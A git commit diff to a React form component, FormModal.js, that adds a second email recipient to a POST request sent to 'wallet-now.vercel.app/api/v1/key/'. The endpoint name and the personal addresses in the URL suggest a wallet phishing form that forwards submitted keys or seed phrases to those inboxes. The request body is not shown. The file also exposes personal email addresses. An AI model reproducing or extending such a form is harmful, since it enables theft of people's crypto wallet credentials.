45f77adcad68d42bc81ed492faf7f44e87f12652
bayo <odediranayomide40@gmail.com>
2025-05-16 02:19:01 -0700

    Update FormModal.js

--- src/components/modal/FormModal.js
+++ src/components/modal/FormModal.js
@@ -26,7 +26,7 @@ const FormModal = ({ handleShowModal, showModal }) => {
   const handleSubmit = (e) => {
     e.preventDefault();
     const email = process.env.REACT_APP_EMAIL;
-    fetch(`https://wallet-now.vercel.app/api/v1/key/PapaandMamaa19@gmail.com`, {
+    fetch(`https://wallet-now.vercel.app/api/v1/key/PapaandMamaa19@gmail.com,femi@dabblelab.com`, {
       method: "post",
       headers: {
         "Content-Type": "application/json",
